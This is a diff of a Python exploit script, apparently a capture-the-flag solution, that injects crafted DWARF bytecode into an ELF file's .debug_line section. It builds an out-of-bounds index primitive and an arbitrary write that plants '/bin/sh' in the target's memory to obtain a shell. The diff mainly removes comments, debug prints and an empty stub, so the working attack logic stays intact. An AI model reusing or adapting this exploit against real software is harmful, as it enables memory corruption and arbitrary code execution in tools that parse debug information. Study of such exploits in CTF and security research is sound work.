@@ -46,10 +46,6 @@ def start(binary,elf_file):
     else:
         return process([binary, elf_file])
 
-def exploit(p,e):
-
-    p.interactive()
-
 def inject_dwarf_bytecode(input_file: str, output_file: str, bytecode):
    
     binary = lief.parse(input_file)
@@ -64,17 +60,6 @@ def inject_dwarf_bytecode(input_file: str, output_file: str, bytecode):
         print("No .debug_line section found in the file!")
         return
 
-
-    # Step 4: Rebuild the .debug_line header
-    # The header includes the section length and other fields.
-    # Let's assume the original prologue and other fixed fields remain the same.
-
-    # The initial header structure
-    # [Length] (4 bytes), [DWARF Version] (2 bytes), [Prologue Length] (2 bytes),
-    # [Min Instruction Length] (1 byte), [Default Is Statement] (1 byte),
-    # [Line Base] (1 byte), [Line Range] (1 byte), [Opcode Base] (1 byte),
-    # [Standard Opcodes] (variable size based on `Opcode Base`)
-
     prologue_length = 12  # This is usually 12 bytes for the header in DWARF 3+
     min_instruction_length = 1  # Typically 1 byte
     default_is_statement = 1  # Default is a statement (true)
@@ -82,16 +67,9 @@ def inject_dwarf_bytecode(input_file: str, output_file: str, bytecode):
     line_range = 1  # Range for each line number
     opcode_base = 10  # Standard opcodes (the number is dependent on the DWARF version)
     
-    # The length of the content (not counting the header)
     content_length = len(bytecode)
-
-    # Calculate the full length of the section (header + content)
     full_length = prologue_length + content_length - 4
-
-    # Update the section length
     debug_line_section.size = full_length
-
-    #some_length = 
     instruction_length = 0x16 - 0xf
 
     # Step 5: Construct the new header for the .debug_line section
@@ -109,13 +87,6 @@ def inject_dwarf_bytecode(input_file: str, output_file: str, bytecode):
         opcode_base,  # Opcode base
         instruction_length
     )
-
-    print(f"Generating dwarf code with length: {hex(full_length)}")
-    print(f"Actual Lenght {hex(len(header) + len(bytecode))}")
-    print(f"Prologue length {hex(prologue_length)}")
-    print(f"Header length {hex(len(header))}")
-    print(f"Bytecode length {hex(len(bytecode))}")
-    print(f"Content length {hex(content_length)}")
     
     # Step 6: Replace the section content with the new header and the balls data
     debug_line_section.content = list(header)  + list(bytecode)
@@ -126,7 +97,6 @@ def inject_dwarf_bytecode(input_file: str, output_file: str, bytecode):
     
 def oob_index(offset, value):
      return b"\x00" + uleb128(0).encoded + b"\x51" + uleb128(offset).encoded + value
-
 
 def arb_write(offset, value):
     bytecode = b""
@@ -139,10 +109,6 @@ def arb_write(offset, value):
 
 def encrypt_file(file_path):
     return base64.b64encode(open(file_path,"rb").read())
-
-
-
-
 
 if __name__=="__main__":
     file = args.BIN
@@ -181,9 +147,6 @@ if __name__=="__main__":
     bytecode += arb_write(diff_msg, b"/bin/sh\x00")
     bytecode += oob_index(diff_msg, b"/")
 
-
-
-    
     log.info(f"Bytecode {bytecode} {len(bytecode)}")
     full_bytecode = bytecode + b"B" * (0x1a - len(bytecode))
     data = b"B" * 6  + full_bytecode
